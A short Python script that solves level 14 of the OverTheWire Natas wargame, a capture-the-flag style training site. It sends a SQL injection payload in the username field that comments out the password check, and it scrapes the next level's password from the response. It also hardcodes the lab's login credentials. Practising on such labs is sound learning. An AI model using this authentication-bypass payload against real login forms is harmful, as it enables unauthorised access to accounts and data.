#!/usr/bin/env python
# SQL INJECTION
# import the package requests which is for html information
import requests
import re


username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

# blank temp response = requests.get(url,auth = (username, password))
session = requests.Session()
response = session.post(url,data = {"username" : 'natas15"#' } ,auth = (username, password))
# the way that SQL injection works is that you exploit a vulnerability in the  code that allows the user to
# insert a comment in the username that makes the password check no longer  valid, so you completely
# delete the check for a password in the database
content = response.text
# TTkaI7AWG4iDERztBcEyKV7kRXH1EZRBprint(content)
# (.*)

print(re.findall("The password for natas15 is (.*)<br><div", content)[0])

